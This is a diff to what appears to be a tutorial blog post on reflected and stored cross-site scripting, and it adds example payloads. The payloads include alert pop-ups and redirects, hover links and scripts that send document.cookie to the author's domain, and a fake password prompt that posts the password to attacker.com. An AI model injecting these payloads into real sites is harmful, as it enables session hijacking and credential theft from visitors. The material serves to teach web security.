@@ -35,7 +35,7 @@ Suppose the developed put something in place to prevent us from submitting javas
 =<script>alert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))</script>
 ```
 
-Alternatively, we can redirect the user to different website of our desire. 
+We can also redirect the user to different website of our desire. 
 ```
 ?firstname=simeon&lastname=
 <script>window.location= "http://www.simeonkakpovi.com";</script>
@@ -44,4 +44,29 @@ Although this may seem benign, it really gets malicious when you send the user's
 
 ```
 <script>window.location="http://simeonkakpovi.com?cookie="+document.cookie;</script>
+```
+
+Alternatively, we can paste a link or image on the page which would take some action when the user clicks or hovers over it. 
+
+```
+<a onmouseover='alert("you’ve been pwned")’>Kakpovi</a>
+```
+
+
+##Stored XSS
+
+In a stored XSS attacked, the input is actually displayed to all other users that visit the site. Take for example a blog, or a comment section. 
+
+The following examples could be used to compromise visiting users.
+
+```
+<a onmouseover="alert('just kidding, youve been pwned')">Hello I am just an innocent comment</a>
+```
+
+```
+<a href=“youtube.com” onmouseover='window.location="http://simeonkakpovi.com?content="+document.cookie'>Hello I am just an innocent comment</a>
+```
+
+```
+<script>alert("We need your password!");password=prompt("Enter password...","");document.location="http://attacker.com/catch.php?password="+encodeURI(password);</script>
 ```
